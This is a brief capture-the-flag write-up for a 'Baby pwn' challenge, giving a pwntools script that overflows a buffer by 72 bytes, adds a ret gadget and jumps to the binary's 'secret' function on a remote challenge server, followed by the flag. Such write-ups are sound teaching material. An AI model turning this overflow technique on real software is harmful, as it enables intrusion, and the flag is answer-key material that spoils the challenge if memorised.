# Baby pwn

Solved by: @mfkrypt

## Question:

Here’s a baby pwn challenge for you to try out. Can you get the flag? 

## Solution:
```
from pwn import *

elf = context.binary = ELF('./baby-pwn', checksec=False)
context.log_level = 'debug'

# io = process()
io = remote('34.162.142.123', 5000)

offset = 72
ret = 0x40101a

payload = flat(
    b'A' * offset,
    ret,
    elf.sym['secret']
)

io.sendline(payload)
io.interactive()

```

**Flag:** `uoftctf{buff3r_0v3rfl0w5_4r3_51mp13_1f_y0u_kn0w_h0w_t0_d0_1t}`
